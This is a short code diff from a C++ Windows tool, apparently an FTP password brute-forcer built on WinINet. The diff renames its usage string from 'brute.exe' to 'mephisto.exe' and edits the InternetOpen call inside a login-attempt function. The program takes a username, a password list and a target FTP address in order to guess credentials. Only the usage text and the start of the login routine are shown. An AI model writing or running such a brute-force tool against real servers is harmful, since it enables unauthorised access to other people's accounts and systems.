@@ -8,11 +8,11 @@
 #pragma comment(lib, "wininet.lib")
 
 void usage() {
-    std::cout << "Usage: brute.exe -l <username> -P <password list> <ftp://<target ip>>" << std::endl;
+    std::cout << "Usage: mephisto.exe -l <username> -P <password list> <ftp://<target ip>>" << std::endl;
 }
 
 bool tryFtpLogin(const std::string& username, const std::string& password, const std::string& ftpUrl) {
-    HINTERNET hInternet = InternetOpen(L"FTPBruteForcer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    HINTERNET hInternet = InternetOpen("FTPBruteForcer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) {
         std::cerr << "Failed to initialize internet session." << std::endl;
         return false;
